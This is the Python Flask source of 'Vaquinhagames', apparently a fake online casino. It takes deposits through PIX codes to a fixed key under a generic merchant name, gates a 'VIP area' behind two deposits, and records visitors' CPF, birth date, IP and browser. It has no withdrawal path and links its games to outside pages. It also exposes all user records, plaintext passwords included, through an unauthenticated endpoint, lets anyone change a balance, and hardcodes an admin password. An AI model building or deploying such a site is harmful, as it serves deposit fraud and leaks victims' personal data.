#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vaquinhagames — Flask + PIX + contador de visitas."""

import os, json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, Response

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
PUBLIC_DIR  = os.path.join(BASE_DIR, "public")

app = Flask(__name__, static_folder=PUBLIC_DIR, static_url_path="")

PIX_KEY       = "6377167@vakinha.com.br"
MERCHANT_NAME = "PAGAMENTO"
MERCHANT_CITY = "BRASIL"
VALOR_MINIMO  = 5.00
ADMIN_SENHA   = "temple2026"

USERS_FILE  = os.path.join(BASE_DIR, "usuarios.json")
PIX_FILE    = os.path.join(BASE_DIR, "pix_pendentes.json")
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")
VISITAS_FILE = os.path.join(BASE_DIR, "visitas.json")

CONFIG_PADRAO = {
    "empresa": {"nome": "Vaquinhagames","descricao_pix": "Vaquinhagames - Creditos","logo_emoji": "🎰"},
    "banner": "VAQUINHAGAMES",
    "cores": {"dourado": "#e5b82e", "dourado_claro": "#f5cf54"},
    "jogos": [
        {"nome":"Zeus vs Hades","link":"https://www.pragmaticplay.com/br/jogos/zeus-vs-hades-gods-of-war-250/?gamelang=br&cur=BRL","imagem":"https://i.ibb.co/PzcPLBtg/Screenshot-2026-09-30-10-34-24-313-com-android-chrome.png"},
        {"nome":"Fortune Tiger","link":"https://templeofgames.com/gameDetailIos?gameId=23537","imagem":"https://i.ibb.co/bRgRw8kF/Screenshot-2026-09-30-10-34-02-165-com-android-chrome.png"},
        {"nome":"Gates of Olympus","link":"https://www.pragmaticplay.com/br/jogos/gates-of-olympus/","imagem":"https://i.ibb.co/PvtjC7rg/Screenshot-2026-09-30-10-33-44-230-com-android-chrome.png"},
        {"nome":"Fortune Rabbit","link":"https://templeofgames.com/gameDetailIos?gameId=23536","imagem":"https://i.ibb.co/bTkYQCz/Screenshot-2026-09-30-10-33-26-327-com-android-chrome.png"},
        {"nome":"Fortune Ox","link":"https://templeofgames.com/gameDetailIos?gameId=12475","imagem":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPlVsMXAaZ130eBumGDhW3NVDNn5-LTJx-mqtT5ha3ww&s=10"},
        {"nome":"Tigre Sortudo","link":"#","imagem":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRRIuMG3iUsuQD8dvF50cbQiohl7vcsek71fV98_pRYCg&s=10"},
        {"nome":"Fortune Dragon","link":"#","imagem":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYNKBNAec0CrMnlVic1KyG0f80jsI9Q9WmYhBY7NlSPw&s=10"},
        {"nome":"Area VIP - Faca 2 depositos no minimo para liberar","link":"#vip","imagem":"https://casasdeapostasonline.pt/wp-content/uploads/2024/11/pragmatic.jpg","vip":True}
    ]
}

def ler_json(c, p):
    if not os.path.exists(c): return p
    try:
        with open(c, "r", encoding="utf-8") as f: return json.load(f)
    except Exception: return p

def salvar_json(c, d):
    with open(c, "w", encoding="utf-8") as f:
        json.dump(d, f, ensure_ascii=False, indent=2)

def get_config():
    cfg = ler_json(CONFIG_FILE, None)
    if not cfg:
        salvar_json(CONFIG_FILE, CONFIG_PADRAO)
        return CONFIG_PADRAO
    for k, v in CONFIG_PADRAO.items():
        if k not in cfg: cfg[k] = v
    return cfg

def get_ip_cliente():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    if request.headers.get("CF-Connecting-IP"):
        return request.headers.get("CF-Connecting-IP")
    return request.remote_addr or "desconhecido"

# ============ PIX ============
def campo(tag, valor):
    valor = str(valor)
    return f"{tag}{len(valor):02d}{valor}"

def crc16(payload):
    crc = 0xFFFF
    for byte in payload.encode("utf-8"):
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return f"{crc:04X}"

def gerar_pix(valor, txid="***"):
    valor_pix = f"{float(valor):.2f}"
    merchant_account = campo("00", "br.gov.bcb.pix") + campo("01", PIX_KEY)
    payload = (
        campo("00","01") + campo("01","11") +
        campo("26", merchant_account) +
        campo("52","0000") + campo("53","986") +
        campo("54", valor_pix) + campo("58","BR") +
        campo("59", MERCHANT_NAME) + campo("60", MERCHANT_CITY) +
        campo("62", campo("05", txid)) + "6304"
    )
    return payload + crc16(payload)

# ============ VISITAS ============
def registrar_visita(pagina):
    v = ler_json(VISITAS_FILE, [])
    v.insert(0, {
        "ip": get_ip_cliente(),
        "ua": request.headers.get("User-Agent", "")[:180],
        "ref": request.headers.get("Referer", "")[:180],
        "pagina": pagina,
        "data": datetime.now().isoformat()
    })
    v = v[:2000]  # mantém só as últimas 2000
    salvar_json(VISITAS_FILE, v)

@app.before_request
def contar_visita():
    # Só conta acessos à página principal e rotas públicas
    if request.method != "GET": return
    p = request.path
    if p.startswith("/admin") or p.startswith("/api") or p.startswith("/static"): return
    if p == "/" or p.endswith(".html"):
        try: registrar_visita(p)
        except Exception: pass

# ============ ROTAS ============
@app.route("/")
def root(): return send_from_directory(PUBLIC_DIR, "index.html")

@app.route("/<path:path>")
def static_files(path): return send_from_directory(PUBLIC_DIR, path)

@app.route("/api/config")
def api_get_config(): return jsonify(get_config())

@app.route("/api/usuarios", methods=["GET"])
def listar_usuarios(): return jsonify(ler_json(USERS_FILE, {}))

@app.route("/api/usuarios", methods=["POST"])
def salvar_usuario():
    data = request.get_json() or {}
    email = (data.get("email") or "").strip().lower()
    if not email: return jsonify({"erro": "E-mail obrigatorio"}), 400
    users = ler_json(USERS_FILE, {})
    if email in users: return jsonify({"erro": "E-mail ja cadastrado"}), 409
    users[email] = {
        "nome": (data.get("nome") or "").strip(),
        "cpf":  (data.get("cpf") or "").strip(),
        "email": email, "senha": data.get("senha", ""),
        "nasc": data.get("nasc", ""), "saldo": 0.0, "historico": [],
        "ip_capturado": get_ip_cliente(),
        "criado_em": datetime.now().isoformat(),
        "user_agent": request.headers.get("User-Agent", "")[:200]
    }
    salvar_json(USERS_FILE, users)
    return jsonify({"ok": True, "email": email})

@app.route("/api/usuarios/<email>", methods=["GET"])
def obter_usuario(email):
    u = ler_json(USERS_FILE, {}).get(email.lower())
    if not u: return jsonify({"erro": "Usuario nao encontrado"}), 404
    return jsonify({k: v for k, v in u.items() if k != "senha"})

@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json() or {}
    email = (data.get("email") or "").strip().lower()
    senha = data.get("senha", "")
    u = ler_json(USERS_FILE, {}).get(email)
    if not u: return jsonify({"erro": "E-mail nao cadastrado"}), 404
    if u.get("senha") != senha: return jsonify({"erro": "Senha incorreta"}), 401
    return jsonify({"ok": True, "nome": u.get("nome"), "email": u.get("email"), "saldo": u.get("saldo", 0.0)})

@app.route("/api/usuarios/<email>/saldo", methods=["POST"])
def atualizar_saldo(email):
    data = request.get_json() or {}
    delta = float(data.get("delta", 0))
    motivo = data.get("motivo", "Ajuste")
    users = ler_json(USERS_FILE, {})
    u = users.get(email.lower())
    if not u: return jsonify({"erro": "Usuario nao encontrado"}), 404
    u["saldo"] = round((u.get("saldo", 0.0) + delta), 2)
    u.setdefault("historico", []).insert(0, {"tipo": motivo, "valor": delta, "data": datetime.now().isoformat()})
    u["historico"] = u["historico"][:50]
    salvar_json(USERS_FILE, users)
    return jsonify({"ok": True, "saldo": u["saldo"]})

@app.route("/api/usuarios/<email>/historico")
def historico_usuario(email):
    u = ler_json(USERS_FILE, {}).get(email.lower())
    if not u: return jsonify({"erro": "Usuario nao encontrado"}), 404
    return jsonify(u.get("historico", []))

@app.route("/api/criar-pix", methods=["POST"])
def api_criar_pix():
    data = request.get_json() or {}
    try:
        valor = float(data.get("valor", 0))
    except (TypeError, ValueError):
        return jsonify({"erro": "Valor invalido."}), 400
    if valor < VALOR_MINIMO:
        return jsonify({"erro": f"Valor minimo: R$ {VALOR_MINIMO:.2f}"}), 400
    email_user = (data.get("email") or "").strip().lower()
    txid = "VK" + datetime.now().strftime("%H%M%S")
    codigo = gerar_pix(valor, txid=txid)
    pend = ler_json(PIX_FILE, {})
    chave = f"local_{datetime.now().strftime('%Y%m%d%H%M%S')}_{email_user}"
    pend[chave] = {"email": email_user, "valor": valor, "criado_em": datetime.now().isoformat(), "status": "PENDENTE", "codigo": codigo}
    salvar_json(PIX_FILE, pend)
    return jsonify({"payment_id": chave, "payload": codigo, "encodedImage": ""})

# ============ ADMIN ============
ADMIN_HTML = """<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin - Vaquinhagames</title>
<meta name="robots" content="noindex,nofollow">
<style>
:root{--red:#e63946;--bg:#0f212e;--bg2:#1a2c38;--bg3:#213743;--bd:#2a4050;--txt:#fff;--mut:#8ba0b0;--grn:#00e701;--gold:#f3ba2f}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--txt);font-family:Arial,sans-serif;padding:16px}
.wrap{max-width:1200px;margin:0 auto}
h1{color:var(--gold);font-size:22px;margin-bottom:20px}
h2{color:var(--gold);font-size:15px;margin:20px 0 10px;text-transform:uppercase;letter-spacing:1px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:20px}
.stat{background:var(--bg2);border:1px solid var(--bd);border-radius:10px;padding:14px}
.stat b{display:block;color:var(--mut);font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
.stat span{font-size:22px;font-weight:900;color:var(--grn)}
.stat.gold span{color:var(--gold)}
table{width:100%;border-collapse:collapse;background:var(--bg2);border-radius:10px;overflow:hidden;font-size:12px}
th{background:var(--bg3);color:var(--gold);padding:10px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:.8px}
td{padding:10px;border-bottom:1px solid var(--bd)}
tr:hover td{background:var(--bg3)}
.btn{background:var(--red);color:#fff;border:none;padding:8px 14px;border-radius:6px;font-weight:700;cursor:pointer;font-size:12px}
.btn.gold{background:var(--gold);color:#000}
.tab{display:inline-block;padding:8px 14px;background:var(--bg2);border:1px solid var(--bd);border-radius:6px;color:var(--mut);cursor:pointer;font-weight:700;font-size:12px;margin-right:6px}
.tab.ativo{background:var(--red);color:#fff;border-color:var(--red)}
.painel{display:none}.painel.ativo{display:block}
</style></head><body>
<div class="wrap">
<h1>🐂 Painel Admin — Vaquinhagames</h1>

<div>
<div class="tab ativo" onclick="aba('visitas',this)">👁 Visitas</div>
<div class="tab" onclick="aba('usuarios',this)">👥 Usuários</div>
<div class="tab" onclick="aba('pix',this)">💰 PIX</div>
</div>

<div class="painel ativo" id="p-visitas">
  <div class="stats" id="stats-visitas"></div>
  <h2>Últimas visitas</h2>
  <div style="overflow-x:auto"><table id="tab-visitas">
    <thead><tr><th>Data/Hora</th><th>IP</th><th>Página</th><th>Navegador</th></tr></thead>
    <tbody></tbody>
  </table></div>
</div>

<div class="painel" id="p-usuarios">
  <div class="stats" id="stats-users"></div>
  <h2>Usuários cadastrados</h2>
  <div style="overflow-x:auto"><table id="tab-users">
    <thead><tr><th>Nome</th><th>E-mail</th><th>CPF</th><th>Saldo</th><th>IP</th><th>Data</th><th>Ação</th></tr></thead>
    <tbody></tbody>
  </table></div>
</div>

<div class="painel" id="p-pix">
  <h2>PIX Pendentes</h2>
  <div style="overflow-x:auto"><table id="tab-pix">
    <thead><tr><th>Usuário</th><th>Valor</th><th>Criado em</th><th>Status</th><th>Ação</th></tr></thead>
    <tbody></tbody>
  </table></div>
</div>

</div>
<script>
const SENHA = new URLSearchParams(location.search).get('s');
function aba(nome,el){
  document.querySelectorAll('.painel').forEach(p=>p.classList.remove('ativo'));
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('ativo'));
  document.getElementById('p-'+nome).classList.add('ativo');
  el.classList.add('ativo');
}
async function carregar(){
  // VISITAS
  const v = await (await fetch('/api/visitas')).json();
  const total = v.length;
  const hoje = v.filter(x=>x.data && x.data.slice(0,10)===new Date().toISOString().slice(0,10)).length;
  const ipsUnicos = new Set(v.map(x=>x.ip)).size;
  document.getElementById('stats-visitas').innerHTML =
    '<div class="stat"><b>Visitas hoje</b><span>'+hoje+'</span></div>'+
    '<div class="stat gold"><b>Total visitas</b><span>'+total+'</span></div>'+
    '<div class="stat"><b>IPs únicos</b><span>'+ipsUnicos+'</span></div>';
  const tbV = document.querySelector('#tab-visitas tbody');
  tbV.innerHTML = v.slice(0,100).map(x=>{
    const dt = (x.data||'').slice(0,16).replace('T',' ');
    return '<tr><td>'+dt+'</td><td>'+x.ip+'</td><td>'+(x.pagina||'/')+'</td><td style="color:var(--mut);font-size:10px">'+(x.ua||'').slice(0,60)+'</td></tr>';
  }).join('') || '<tr><td colspan="4" style="text-align:center;padding:20px">Nenhuma visita</td></tr>';

  // USERS
  const u = await (await fetch('/api/usuarios')).json();
  const totalU = Object.keys(u).length;
  const saldoTotal = Object.values(u).reduce((s,x)=>s+(x.saldo||0),0);
  document.getElementById('stats-users').innerHTML =
    '<div class="stat"><b>Usuários</b><span>'+totalU+'</span></div>'+
    '<div class="stat gold"><b>Saldo total</b><span>R$ '+saldoTotal.toFixed(2)+'</span></div>';
  const tbU = document.querySelector('#tab-users tbody');
  tbU.innerHTML = Object.entries(u).map(([e,x])=>{
    return '<tr><td>'+(x.nome||'-')+'</td><td>'+e+'</td><td>'+(x.cpf||'-')+'</td>'+
      '<td style="color:var(--grn);font-weight:800">R$ '+(x.saldo||0).toFixed(2)+'</td>'+
      '<td style="font-size:10px;color:var(--mut)">'+(x.ip_capturado||'-')+'</td>'+
      '<td style="font-size:10px;color:var(--mut)">'+((x.criado_em||'').slice(0,16).replace('T',' '))+'</td>'+
      '<td><button class="btn gold" onclick="addSaldo(\\''+e+'\\')">+R$</button></td></tr>';
  }).join('') || '<tr><td colspan="7" style="text-align:center;padding:20px">Nenhum usuário</td></tr>';

  // PIX
  const p = await (await fetch('/api/pix-pendentes')).json();
  const tbP = document.querySelector('#tab-pix tbody');
  tbP.innerHTML = Object.entries(p).map(([id,x])=>{
    const st = x.status==='PAGO'?'PAGO ✅':'PENDENTE ⏳';
    return '<tr><td>'+x.email+'</td><td>R$ '+x.valor.toFixed(2)+'</td>'+
      '<td>'+((x.criado_em||'').slice(0,16).replace('T',' '))+'</td><td>'+st+'</td>'+
      '<td>'+(x.status==='PAGO'?'-':'<button class="btn" onclick="confPix(\\''+id+'\\')">Confirmar</button>')+'</td></tr>';
  }).join('') || '<tr><td colspan="5" style="text-align:center;padding:20px">Nenhum PIX</td></tr>';
}
async function addSaldo(email){
  const v = prompt("Adicionar quanto para "+email+"?");
  if(!v) return;
  const valor = parseFloat(v.replace(",","."));
  if(!valor) return alert("Valor inválido");
  const r = await fetch('/api/usuarios/'+encodeURIComponent(email)+'/saldo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({delta:valor,motivo:"Depósito manual"})});
  if(r.ok){ alert('Saldo adicionado!'); carregar(); }
}
async function confPix(id){
  if(!confirm("Confirmar PIX?")) return;
  const r = await fetch('/admin/confirmar-pix?s='+SENHA,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})});
  if(r.ok){ alert('PIX confirmado!'); carregar(); }
}
carregar();
</script></body></html>"""

@app.route("/admin")
def admin_panel():
    if request.args.get("s", "") != ADMIN_SENHA:
        return """<html><body style='background:#0f212e;color:#fff;font-family:Arial;padding:40px'>
        <h2>🔒 Admin</h2><form method='get'>
        <input name='s' type='password' placeholder='Senha' style='padding:12px;font-size:16px;border-radius:8px;border:1px solid #2a4050;background:#1a2c38;color:#fff'>
        <button type='submit' style='padding:12px 24px;background:#e63946;color:#fff;border:none;font-weight:bold;border-radius:8px;cursor:pointer'>Entrar</button>
        </form></body></html>""", 401
    return ADMIN_HTML

@app.route("/api/visitas")
def api_visitas():
    return jsonify(ler_json(VISITAS_FILE, []))

@app.route("/admin/salvar", methods=["POST"])
def admin_salvar():
    if request.args.get("s", "") != ADMIN_SENHA:
        return jsonify({"erro": "Senha invalida"}), 401
    salvar_json(CONFIG_FILE, request.get_json() or {})
    return jsonify({"ok": True})

@app.route("/api/pix-pendentes", methods=["GET"])
def api_pix_pendentes():
    return jsonify(ler_json(PIX_FILE, {}))

@app.route("/admin/confirmar-pix", methods=["POST"])
def admin_confirmar_pix():
    if request.args.get("s", "") != ADMIN_SENHA:
        return jsonify({"erro": "Senha invalida"}), 401
    data = request.get_json() or {}
    pid = data.get("id")
    pix = ler_json(PIX_FILE, {})
    info = pix.get(pid)
    if not info: return jsonify({"erro": "PIX nao encontrado"}), 404
    if info.get("status") == "PAGO": return jsonify({"ok": True})
    users = ler_json(USERS_FILE, {})
    u = users.get(info["email"])
    if u:
        u["saldo"] = round(u.get("saldo", 0.0) + info["valor"], 2)
        u.setdefault("historico", []).insert(0, {"tipo": "Deposito PIX", "valor": info["valor"], "data": datetime.now().isoformat()})
        u["historico"] = u["historico"][:50]
        salvar_json(USERS_FILE, users)
    info["status"] = "PAGO"
    info["pago_em"] = datetime.now().isoformat()
    salvar_json(PIX_FILE, pix)
    return jsonify({"ok": True})

if __name__ == "__main__":
    get_config()
    port = int(os.environ.get("PORT", 8080))
    print("Vaquinhagames rodando na porta", port)
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
